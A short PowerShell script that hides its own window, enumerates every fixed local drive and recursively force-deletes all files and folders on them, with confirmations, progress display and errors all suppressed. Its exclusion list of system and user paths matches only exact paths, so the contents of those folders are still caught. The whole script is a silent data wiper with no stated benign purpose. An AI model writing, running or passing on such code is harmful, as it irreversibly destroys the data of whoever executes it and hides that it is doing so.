Add-Type -AssemblyName System.Windows.Forms
[void][System.Windows.Forms.Application]::EnableVisualStyles()

Start-Sleep -Milliseconds 100
[System.Diagnostics.Process]::GetCurrentProcess().CloseMainWindow() > $null

$disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID

$excludedPaths = @(
    "${env:SystemRoot}",
    "${env:ProgramFiles}",
    "${env:ProgramFiles(x86)}",
    "${env:USERPROFILE}",
    "${env:SYSTEMDRIVE}\System Volume Information",
    "${env:SYSTEMDRIVE}\PerfLogs",
    "${env:SYSTEMDRIVE}\ProgramData",
    "${env:SYSTEMDRIVE}\pagefile.sys",
    "${env:SYSTEMDRIVE}\hiberfil.sys",
    "${env:SYSTEMDRIVE}\swapfile.sys"
)

$ProgressPreference = 'SilentlyContinue'

foreach ($disk in $disks.DeviceID) {

    $itemsToDelete = Get-ChildItem -Path "$disk\" -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object { -not ($excludedPaths -contains $_.FullName) }

    foreach ($item in $itemsToDelete) {

        if (Test-Path $item.FullName) {
            try {
                Remove-Item -LiteralPath $item.FullName -Recurse -Force -ErrorAction Stop -Confirm:$false
            } catch {}
        }
    }
}
